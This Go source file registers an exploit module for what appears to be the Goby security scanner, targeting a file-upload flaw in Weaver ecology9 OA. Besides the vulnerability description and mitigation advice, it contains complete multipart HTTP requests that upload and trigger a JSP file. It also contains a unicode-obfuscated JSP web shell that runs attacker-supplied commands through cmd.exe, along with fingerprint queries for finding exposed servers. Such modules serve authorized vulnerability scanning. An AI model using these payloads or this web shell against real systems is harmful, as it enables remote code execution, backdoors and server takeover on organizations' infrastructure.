package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Weaver ecology9 OA system uploaderOperate.jsp file file upload vulnerability",
    "Description": "<p>E-cology is an OA platform for large and medium-sized organizations. It adopts the way of privatization deployment, flexible background configuration, easily responds to the changing management needs of the organization, and relies on new design concepts and management ideas to build a new and efficient collaborative office environment for large and medium-sized organizations.</p><p>There is a file upload vulnerability in the latest version of weaver ecology9, which allows attackers to upload JSP Trojan files and execute arbitrary code.</p>",
    "Impact": "<p>There is a file upload vulnerability in the latest version of weaver ecology9, which allows attackers to upload JSP Trojan files and execute arbitrary code.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability yet. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.weaver.com.cn/cs/securityDownload.html#\">https://www.weaver.com.cn/cs/securityDownload.html#</a></p><p>2. Set access policies and white list access through security devices such as firewalls.</p><p>3. If not necessary, prohibit the public network from accessing the system.</p>",
    "Product": "Weaver ecology-9 OA",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "泛微-协同办公 OA 系统 uploaderOperate.jsp 文件任意文件上传漏洞",
            "Product": "泛微-协同办公OA",
            "Description": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">e-cology是一款面向大中型组织的OA平台，采用私有化部署的方式，灵活的后台配置，轻松应对组织不断变化的管理需求，依托全新的设计理念和管理思想，为大中型组织构建全新的高效协同办公环境。</span></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">泛微ecology9最新版存在文件上传漏洞，<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者可上传jsp木马文件执行任意代码。</span></span><br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.weaver.com.cn/cs/securityDownload.html#\">https://www.weaver.com.cn/cs/securityDownload.html#</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p><span style=\"color: var(--primaryFont-color);\">3、如非必要，禁止公网访问该系统。</span></p>",
            "Impact": "<p>攻击者可上传jsp木马文件执行任意代码，写入后门，获取服务器权限。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Weaver ecology9 OA system uploaderOperate.jsp file file upload vulnerability",
            "Product": "Weaver ecology-9 OA",
            "Description": "<p>E-cology is an OA platform for large and medium-sized organizations. It adopts the way of privatization deployment, flexible background configuration, easily responds to the changing management needs of the organization, and relies on new design concepts and management ideas to build a new and efficient collaborative office environment for large and medium-sized organizations.</p><p>There is a file upload vulnerability in the latest version of weaver ecology9, which allows attackers to upload JSP Trojan files and execute arbitrary code.</p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability yet. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.weaver.com.cn/cs/securityDownload.html#\">https://www.weaver.com.cn/cs/securityDownload.html#</a></p><p>2. Set access policies and white list access through security devices such as firewalls.</p><p>3. If not necessary, prohibit the public network from accessing the system.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">There is a file upload vulnerability in the latest version of weaver ecology9, which allows attackers to upload JSP Trojan files and execute arbitrary code.</span><br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\"",
    "GobyQuery": "header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\"",
    "Author": "724970936",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-03-22",
    "References": [
        "https://fofa.info/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-C-2022-398377"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/workrelate/plan/util/uploaderOperate.jsp",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=44d3e4be5e5751d3c0e578e61826e9b2"
                },
                "data_type": "text",
                "data": "--44d3e4be5e5751d3c0e578e61826e9b2\nContent-Disposition: form-data; name=\"secId\"\r\n\r\n1\r\n--44d3e4be5e5751d3c0e578e61826e9b2\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"weav.jsp\"\r\n\r\n\r\n<% out.print(\"test\".hashCode()); %>\r\n--44d3e4be5e5751d3c0e578e61826e9b2\r\nContent-Disposition: form-data; name=\"plandetailid\"\r\n\r\n1\r\n--44d3e4be5e5751d3c0e578e61826e9b2--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "fileid",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "fileid|lastbody|regex|fileid=(.*?)'"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/OfficeServer",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=9e235be76c2b233433652834efa5d9e4"
                },
                "data_type": "text",
                "data": "--9e235be76c2b233433652834efa5d9e4\r\nContent-Disposition: form-data; name=\"aaa\"\r\n\r\n{'OPTION': 'INSERTIMAGE', 'isInsertImageNew': '1', 'imagefileid4pic': '{{{fileid}}}'}\r\n--9e235be76c2b233433652834efa5d9e4--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/weav.jsp",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "3556498",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/workrelate/plan/util/uploaderOperate.jsp",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=44d3e4be5e5751d3c0e578e61826e9b2"
                },
                "data_type": "text",
                "data": "--44d3e4be5e5751d3c0e578e61826e9b2\nContent-Disposition: form-data; name=\"secId\"\r\n\r\n1\r\n--44d3e4be5e5751d3c0e578e61826e9b2\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"weav.jsp\"\r\n\r\n\r\n<% out.print(\"test\".hashCode()); %>\r\n--44d3e4be5e5751d3c0e578e61826e9b2\r\nContent-Disposition: form-data; name=\"plandetailid\"\r\n\r\n1\r\n--44d3e4be5e5751d3c0e578e61826e9b2--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "fileid",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "fileid|lastbody|regex|fileid=(.*?)'"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/OfficeServer",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=9e235be76c2b233433652834efa5d9e4"
                },
                "data_type": "text",
                "data": "--9e235be76c2b233433652834efa5d9e4\r\nContent-Disposition: form-data; name=\"aaa\"\r\n\r\n{'OPTION': 'INSERTIMAGE', 'isInsertImageNew': '1', 'imagefileid4pic': '{{{fileid}}}'}\r\n--9e235be76c2b233433652834efa5d9e4--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/weav.jsp",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "3556498",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "shellContents",
            "type": "input",
            "value": "<%@ page import=\"java.util.*,java.io.*,java.net.*\"%> <% String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.getContextPath()+request.getRequestURI(); out.println(\"requestURL:\"+basePath+\"<br>\");   %> <% \\u0069\\u0066\\u0020\\u0028\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0020\\u0021\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0029\\u0020\\u007b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e\\u0028\\u0022\\u0043\\u006f\\u006d\\u006d\\u0061\\u006e\\u0064\\u003a\\u0020\\u0022\\u0020\\u002b\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0020\\u002b\\u0020\\u0022\\u005c\\u006e\\u003c\\u0042\\u0052\\u003e\\u0022\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0020\\u0070\\u0020\\u003d\\u0020\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u002e\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0028\\u0029\\u002e\\u0065\\u0078\\u0065\\u0063\\u0028\\u0022\\u0063\\u006d\\u0064\\u002e\\u0065\\u0078\\u0065\\u0020\\u002f\\u0063\\u0020\\u0022\\u0020\\u002b\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002e\\u0067\\u0065\\u0074\\u0050\\u0061\\u0072\\u0061\\u006d\\u0065\\u0074\\u0065\\u0072\\u0028\\u0022\\u0063\\u006d\\u0064\\u0022\\u0029\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u006f\\u0073\\u0020\\u003d\\u0020\\u0070\\u002e\\u0067\\u0065\\u0074\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0069\\u006e\\u0020\\u003d\\u0020\\u0070\\u002e\\u0067\\u0065\\u0074\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0044\\u0061\\u0074\\u0061\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0064\\u0069\\u0073\\u0020\\u003d\\u0020\\u006e\\u0065\\u0077\\u0020\\u0044\\u0061\\u0074\\u0061\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0069\\u006e\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u003d\\u0020\\u0064\\u0069\\u0073\\u002e\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u0028\\u0029\\u003b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0077\\u0068\\u0069\\u006c\\u0065\\u0020\\u0028\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u0021\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0020\\u0029\\u0020\\u007b\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u006c\\u006e\\u0028\\u0064\\u0069\\u0073\\u0072\\u0029\\u003b\\u0020\\u0064\\u0069\\u0073\\u0072\\u0020\\u003d\\u0020\\u0064\\u0069\\u0073\\u002e\\u0072\\u0065\\u0061\\u0064\\u004c\\u0069\\u006e\\u0065\\u0028\\u0029\\u003b\\u0020\\u007d\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u007d %>",
            "show": ""
        },
        {
            "name": "shellName",
            "type": "input",
            "value": "weav.jsp",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "who^ami||id",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10489"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
